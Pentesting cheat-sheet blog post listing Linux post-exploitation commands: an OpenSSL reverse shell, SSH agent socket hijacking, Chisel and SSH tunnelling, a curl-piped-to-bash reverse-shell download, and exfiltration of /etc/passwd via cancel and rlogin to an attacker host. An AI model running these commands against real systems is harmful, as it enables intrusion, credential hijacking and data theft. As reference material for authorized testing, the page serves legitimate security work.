<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/uploads/logo/windows-linux.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/logo/windows-linux.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/logo/windows-linux.png">
  <link rel="mask-icon" href="/uploads/logo/windows-linux.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"chronossec.site","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Obtain access to other resources on the internal network.Transfer files in smart ways.">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux - Pivoting, tunneling, and sending files">
<meta property="og:url" content="https://chronossec.site/Pentesting/Linux/pivot-tunnel-and-send-files/index.html">
<meta property="og:site_name" content="Chronos Security">
<meta property="og:description" content="Obtain access to other resources on the internal network.Transfer files in smart ways.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-08-03T07:00:00.000Z">
<meta property="article:modified_time" content="2024-09-07T11:22:47.584Z">
<meta property="article:author" content="ChronosPK | Marin Radu">
<meta property="article:tag" content="Pentesting">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Pivoting">
<meta property="article:tag" content="Port forwarding">
<meta property="article:tag" content="Tunneling">
<meta property="article:tag" content="Send files">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://chronossec.site/Pentesting/Linux/pivot-tunnel-and-send-files/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://chronossec.site/Pentesting/Linux/pivot-tunnel-and-send-files/","path":"Pentesting/Linux/pivot-tunnel-and-send-files/","title":"Linux - Pivoting, tunneling, and sending files"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Linux - Pivoting, tunneling, and sending files | Chronos Security</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GMH7MEYY9C"></script>
  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-GMH7MEYY9C","only_pageview":false,"measure_protocol_api_secret":null}</script>
  <script src="/js/third-party/analytics/google-analytics.js"></script>



  <script data-pjax defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;99fd3273ef2c49c9af35e952ce7e7f18&quot;}'></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Chronos Security</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Sharing knowledge</p>
      <img class="custom-logo-image" src="/uploads/logo/windows-linux.png" alt="Chronos Security">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">16</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">38</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting"><span class="nav-text">Pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Encrypted-shell-with-OpenSSL"><span class="nav-text">Encrypted shell with OpenSSL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Encrypted-reverse-shell-with-OpenSSl"><span class="nav-text">Encrypted reverse shell with OpenSSl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Alternative-separate-input-and-output-ports"><span class="nav-text">Alternative: separate input and output ports</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hijacking-SSH-agent-connections"><span class="nav-text">Hijacking SSH agent connections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit-route"><span class="nav-text">Metasploit route</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-autoroute"><span class="nav-text">Metasploit autoroute</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunneling-port-forwarding"><span class="nav-text">Tunneling (port forwarding)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH"><span class="nav-text">SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chisel"><span class="nav-text">Chisel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProxyChains-and-port-scanning"><span class="nav-text">ProxyChains (and port scanning)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-text">Metasploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transfer-files"><span class="nav-text">Transfer files</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Host-and-download-reverse-shell"><span class="nav-text">Host and download reverse shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Encrypt-data-in-transit"><span class="nav-text">Encrypt data in transit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exfiltraion-with-cancel-and-rlogin"><span class="nav-text">Exfiltraion with cancel and rlogin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Send-and-request-data-with-curl"><span class="nav-text">Send and request data with curl</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ChronosPK | Marin Radu"
      src="/uploads/logo/windows-linux.png">
  <p class="site-author-name" itemprop="name">ChronosPK | Marin Radu</p>
  <div class="site-description" itemprop="description">CTFs, writeups, cheatsheets, and explanations in cybersecurity</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">39</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">38</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ChronosPK" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChronosPK" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:chronos@chronossec.site" title="E-Mail → mailto:chronos@chronossec.site" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://linkedin.com/in/radumarin001/" title="LinkedIn → https:&#x2F;&#x2F;linkedin.com&#x2F;in&#x2F;radumarin001&#x2F;" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>LinkedIn</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://instagram.com/chronos_security" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;chronos_security" rel="noopener me" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.paypal.com/donate/?hosted_button_id=UXZC74DREB9W8" title="PayPal → https:&#x2F;&#x2F;www.paypal.com&#x2F;donate&#x2F;?hosted_button_id&#x3D;UXZC74DREB9W8" rel="noopener me" target="_blank"><i class="fab fa-paypal fa-fw"></i>PayPal</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://buymeacoffee.com/chronossec" title="buymeacoffee → https:&#x2F;&#x2F;buymeacoffee.com&#x2F;chronossec" rel="noopener me" target="_blank"><i class="fa fa-coffee fa-fw"></i>buymeacoffee</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/sponsors/ChronosPK" title="GitHub Sponsor → https:&#x2F;&#x2F;github.com&#x2F;sponsors&#x2F;ChronosPK" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub Sponsor</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="/categories/CTFs/CSCTF-2024/" title="&#x2F;categories&#x2F;CTFs&#x2F;CSCTF-2024&#x2F;">CSTFs - CSCTF 2024</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/categories/Pentesting/Linux/" title="&#x2F;categories&#x2F;Pentesting&#x2F;Linux&#x2F;">Pentesting - Linux</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/categories/Pentesting/Windows/" title="&#x2F;categories&#x2F;Pentesting&#x2F;Windows&#x2F;">Pentesting - Windows</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/" title=""></a>
            </li>
        </ul>
      </div>
    </div>
        <div class="pjax">
        </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://chronossec.site/Pentesting/Linux/pivot-tunnel-and-send-files/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/logo/windows-linux.png">
      <meta itemprop="name" content="ChronosPK | Marin Radu">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chronos Security">
      <meta itemprop="description" content="CTFs, writeups, cheatsheets, and explanations in cybersecurity">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Linux - Pivoting, tunneling, and sending files | Chronos Security">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Linux - Pivoting, tunneling, and sending files
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 07-09-2024 14:22:47" itemprop="dateModified" datetime="2024-09-07T14:22:47+03:00">07-09-2024</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Pentesting/" itemprop="url" rel="index"><span itemprop="name">Pentesting</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Pentesting/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><hr>
<p>Obtain access to other resources on the internal network.<br>Transfer files in smart ways.</p>
<hr>
<span id="more"></span>

<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><h3 id="Encrypted-shell-with-OpenSSL"><a href="#Encrypted-shell-with-OpenSSL" class="headerlink" title="Encrypted shell with OpenSSL"></a>Encrypted shell with OpenSSL</h3><pre><div class="caption"><span>Generate a certificate</span></div><code class="highlight bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>

<pre><div class="caption"><span>Start an OpenSSL server</span></div><code class="highlight bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>

<pre><div class="caption"><span>Connect from the client</span></div><code class="highlight bash">openssl s_client -quiet -connect <span class="variable">$IP</span>:4444</code></pre>

<br>

<h3 id="Encrypted-reverse-shell-with-OpenSSl"><a href="#Encrypted-reverse-shell-with-OpenSSl" class="headerlink" title="Encrypted reverse shell with OpenSSl"></a>Encrypted reverse shell with OpenSSl</h3><pre><div class="caption"><span>Generate a certificate</span></div><code class="highlight bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>

<pre><div class="caption"><span>Set up the listening server</span></div><code class="highlight bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>

<pre><div class="caption"><span>Connect to the sever from the client and initiate the shell</span></div><code class="highlight bash">openssl s_client -quiet -connect <span class="variable">$IP</span>:4444 | bash</code></pre>

<br>

<h3 id="Alternative-separate-input-and-output-ports"><a href="#Alternative-separate-input-and-output-ports" class="headerlink" title="Alternative: separate input and output ports"></a>Alternative: separate input and output ports</h3><blockquote>
<p>Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.</p>
</blockquote>
<pre><div class="caption"><span>Server 1: Listen on Port 4444 (for sending commands)</span></div><code class="highlight bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>

<pre><div class="caption"><span>Server 2: Listen on Port 4445 (for receiving output)</span></div><code class="highlight bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4445</code></pre>

<pre><div class="caption"><span>Client: Set up a two-way encrypted shell</span></div><code class="highlight bash">openssl s_client -quiet -connect &lt;server_ip&gt;:4444 | bash | openssl s_client -quiet -connect &lt;server_ip&gt;:4445</code></pre>

<br>

<h3 id="Hijacking-SSH-agent-connections"><a href="#Hijacking-SSH-agent-connections" class="headerlink" title="Hijacking SSH agent connections"></a>Hijacking SSH agent connections</h3><blockquote>
<p>In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agent’s socket, typically found in the <code>/tmp</code> directory, is used to communicate with the SSH client.</p>
</blockquote>
<ol>
<li>Find SSH process<pre><code class="highlight bash">ps aux | grep ssh</code></pre></li>
<li>Locate SSH agent socket<pre><code class="highlight bash"><span class="built_in">ls</span> -lah /tmp</code></pre></li>
<li>List cached SSH keys<pre><div class="caption"><span>naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent</span></div><code class="highlight bash">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh-add -l</code></pre></li>
<li>Hijack the SSH agent<pre><code class="highlight bash">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh user@target</code></pre></li>
</ol>
<br>

<h3 id="Metasploit-route"><a href="#Metasploit-route" class="headerlink" title="Metasploit route"></a>Metasploit <code>route</code></h3><pre><div class="caption"><span>Add a route manually</span></div><code class="highlight bash">msf6 &gt; route add 169.254.0.0 255.255.0.0 1
msf6 &gt; route add 172.19.176.0 255.255.240.0 1</code></pre>
<pre><div class="caption"><span>Print the routing table</span></div><code class="highlight bash">msf6 &gt; route <span class="built_in">print</span></code></pre>
<pre><div class="caption"><span>Get specific route information</span></div><code class="highlight bash">msf6 &gt; route get 169.254.204.110</code></pre>
<pre><div class="caption"><span>Remove a specific route</span></div><code class="highlight bash">msf6 &gt; route remove 172.19.176.0/20 1</code></pre>

<br>

<h2 id="Metasploit-autoroute"><a href="#Metasploit-autoroute" class="headerlink" title="Metasploit autoroute"></a>Metasploit <code>autoroute</code></h2><pre><div class="caption"><span>Background the current session</span></div><code class="highlight bash">meterpreter &gt; background</code></pre>
<pre><div class="caption"><span>Use the autoroute module</span></div><code class="highlight bash">msf6 &gt; use post/multi/manage/autoroute</code></pre>
<pre><div class="caption"><span>Set the session and subnet</span></div><code class="highlight bash">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SESSION 1
msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SUBNET 169.254.0.0
msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> NETMASK /16</code></pre>
<pre><div class="caption"><span>Run the module</span></div><code class="highlight bash">msf6 post(multi/manage/autoroute) &gt; run</code></pre>
<pre><div class="caption"><span>Check the routing table</span></div><code class="highlight bash">msf6 post(multi/manage/autoroute) &gt; route</code></pre>

<br>

<h2 id="Tunneling-port-forwarding"><a href="#Tunneling-port-forwarding" class="headerlink" title="Tunneling (port forwarding)"></a>Tunneling (port forwarding)</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><table>
<thead>
<tr>
<th>Argument</th>
<th>Legend</th>
<th>Explanation</th>
</tr>
</thead>
<tbody><tr>
<td><code>-L</code></td>
<td><code>local_port:remote_address:remote_port</code></td>
<td>local port forwarding</td>
</tr>
<tr>
<td><code>-R</code></td>
<td><code>port:local_address:local_port</code></td>
<td>remote port forwarding</td>
</tr>
<tr>
<td><code>-D</code></td>
<td><code>local_port</code></td>
<td>dynamic port forwarding - creates a socks proxy on localhost</td>
</tr>
<tr>
<td><code>-N</code></td>
<td></td>
<td>do not execute a remote command - useful for just forwarding ports</td>
</tr>
</tbody></table>
<br>

<h3 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h3><blockquote>
<p>Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. <em>(as described by its author)</em></p>
</blockquote>
<p>Server (attacker machine with IP <code>10.10.10.20</code>)</p>
<pre><code class="highlight bash">chisel server -p 8000 --reverse</code></pre>
<p>Client (victim machine with IP <code>10.10.10.10</code>, another host with IP <code>10.10.10.30</code>)</p>
<pre><div class="caption"><span>Forward local port 80 from the attacker on port 80 on the victim localhost</span></div><code class="highlight bash">./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80</code></pre>
<pre><div class="caption"><span>Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30</span></div><code class="highlight bash">./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80</code></pre>
<pre><div class="caption"><span>Set up a SOCKS5 proxy on port 1080 on the attacker</span></div><code class="highlight bash">./chisel client 10.10.10.20:8000 R:socks</code></pre>

<br>

<h3 id="ProxyChains-and-port-scanning"><a href="#ProxyChains-and-port-scanning" class="headerlink" title="ProxyChains (and port scanning)"></a>ProxyChains (and port scanning)</h3><ol>
<li><p>Establish SSH connection with dynamic port forwarding</p>
<pre><code class="highlight bash">ssh -D 1337 user@<span class="variable">$IP</span></code></pre>
</li>
<li><p>Configure ProxyChains for dynamic port forwarding</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&quot;socks5 127.0.0.1 1337&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/proxychains.conf
<span class="comment"># Ensure to comment out any socks4 lines in /etc/proxychains.conf</span></code></pre>
</li>
<li><p>Perform port scan through the SSH tunnel</p>
<pre><code class="highlight bash">proxychains nmap -sT 127.0.0.1</code></pre></li>
</ol>
<br>

<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><pre><code class="highlight bash">portfwd add -l 1234 -p 21 -r 10.10.10.20 
portfwd list</code></pre>

<br>

<h2 id="Transfer-files"><a href="#Transfer-files" class="headerlink" title="Transfer files"></a>Transfer files</h2><h3 id="Host-and-download-reverse-shell"><a href="#Host-and-download-reverse-shell" class="headerlink" title="Host and download reverse shell"></a>Host and download reverse shell</h3><p>On attacker machine</p>
<pre><div class="caption"><span>attacker host with IP 10.10.10.20</span></div><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.10.20 9001 &gt;/tmp/f&#x27;</span> &gt; rev.sh
python3 -m http.server 80</code></pre>
<p>Download and run reverse shell</p>
<pre><div class="caption"><span>Method 1</span></div><code class="highlight bash">curl http://10.10.10.20/rev.sh | bash &amp;</code></pre>
<pre><div class="caption"><span>Method 2</span></div><code class="highlight bash">curl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; <span class="built_in">chmod</span> +x /dev/shm/rev.sh
/dev/shm/rev.sh</code></pre>

<br>

<h3 id="Encrypt-data-in-transit"><a href="#Encrypt-data-in-transit" class="headerlink" title="Encrypt data in transit"></a>Encrypt data in transit</h3><pre><div class="caption"><span>Encrypt</span></div><code class="highlight bash">openssl enc -aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt &gt; input.txt.enc</code></pre>
<pre><div class="caption"><span>Decrypt</span></div><code class="highlight bash">openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt.enc &gt; input.txt</code></pre>

<br>

<h3 id="Exfiltraion-with-cancel-and-rlogin"><a href="#Exfiltraion-with-cancel-and-rlogin" class="headerlink" title="Exfiltraion with cancel and rlogin"></a>Exfiltraion with <code>cancel</code> and <code>rlogin</code></h3><blockquote>
<p><strong><code>cancel</code></strong>: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.<br><strong><code>rlogin</code></strong>: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if it’s misconfigured or used in an unconventional way.</p>
</blockquote>
<p>Set up a listener (attacker machine)</p>
<pre><code class="highlight bash">nc -lvnp 443</code></pre>
<p>Send data</p>
<pre><div class="caption"><span>cancel</span></div><code class="highlight bash">cancel -u <span class="string">&quot;<span class="subst">$(cat /etc/passwd | base64)</span>&quot;</span> -h <span class="variable">$IP</span>:443</code></pre>
<pre><div class="caption"><span>rlogin</span></div><code class="highlight bash">rlogin -l <span class="string">&quot;<span class="subst">$(cat /etc/passwd | base64)</span>&quot;</span> -p 443 <span class="variable">$IP</span></code></pre>

<br>

<h3 id="Send-and-request-data-with-curl"><a href="#Send-and-request-data-with-curl" class="headerlink" title="Send and request data with curl"></a>Send and request data with <code>curl</code></h3><pre><code class="highlight bash">curl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin

curl -X MOVE -H <span class="string">&#x27;Destination: http://10.10.10.10/filename.bin&#x27;</span> http://10.10.10.10/file.bin</code></pre>

<br>

<hr>
<hr>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentesting/" rel="tag"><i class="fa fa-tag"></i> Pentesting</a>
              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
              <a href="/tags/Pivoting/" rel="tag"><i class="fa fa-tag"></i> Pivoting</a>
              <a href="/tags/Port-forwarding/" rel="tag"><i class="fa fa-tag"></i> Port forwarding</a>
              <a href="/tags/Tunneling/" rel="tag"><i class="fa fa-tag"></i> Tunneling</a>
              <a href="/tags/Send-files/" rel="tag"><i class="fa fa-tag"></i> Send files</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/Pentesting/Linux/7/" rel="prev" title="7. Post-exploitation - Linux">
                  <i class="fa fa-angle-left"></i> 7. Post-exploitation - Linux
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/Pentesting/Linux/restricted-environment/" rel="next" title="Linux - Restricted environments">
                  Linux - Restricted environments <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ChronosPK | Marin Radu</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/ChronosPK" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
